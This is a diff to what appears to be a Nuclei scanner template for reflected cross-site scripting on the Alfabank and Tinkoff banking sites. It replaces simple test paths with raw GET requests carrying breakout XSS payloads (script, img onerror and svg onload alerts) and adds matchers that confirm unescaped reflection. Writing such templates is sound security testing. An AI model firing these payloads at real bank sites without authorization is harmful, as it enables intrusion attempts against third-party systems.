@@ -4,31 +4,53 @@ info:
   name: Alfabank/Tinkoff - Reflected XSS
   author: bugbounty
   severity: high
-  description: Reflected XSS in various parameters
+  description: Reflected XSS with payload validation
   tags: xss,alfabank,tinkoff
+  reference:
+    - https://portswigger.net/web-security/cross-site-scripting
 
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/404.html?page=<script>alert(1)</script>"
-      - "{{BaseURL}}/search/?text=<script>alert(document.domain)</script>"
-      - "{{BaseURL}}/feedback/support/?code=<img src=x onerror=alert(1)>"
-      - "{{BaseURL}}/api?page=<svg/onload=alert(1)>"
+  - raw:
+      - |
+        GET /404.html?page="><script>alert(document.domain)</script> HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml
+
+      - |
+        GET /search/?text="><img src=x onerror=alert(document.domain)> HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+      - |
+        GET /feedback/support/?code='><svg/onload=alert(document.domain)> HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
 
     matchers-condition: and
     matchers:
-      - type: word
-        part: body
-        words:
-          - "<script>alert"
-          - "<img src=x onerror="
-          - "<svg/onload=alert"
-
       - type: word
         part: header
         words:
           - "text/html"
 
-      - type: status
-        status:
-          - 200
+      - type: regex
+        part: body
+        regex:
+          - '"><script>alert\(document\.domain\)</script>'
+          - '"><img src=x onerror=alert\(document\.domain\)>'
+          - '\'><svg/onload=alert\(document\.domain\)>'
+        condition: or
+
+      - type: dsl
+        dsl:
+          - 'status_code == 200 || status_code == 404'
+          - '!contains(body, "&lt;script&gt;")'
+          - '!contains(body, "&#")'
+        condition: and
+
+    extractors:
+      - type: regex
+        name: reflected_payload
+        part: body
+        regex:
+          - '("><script>.*?</script>|"><img.*?onerror=.*?>|\'><svg.*?onload=.*?>)'
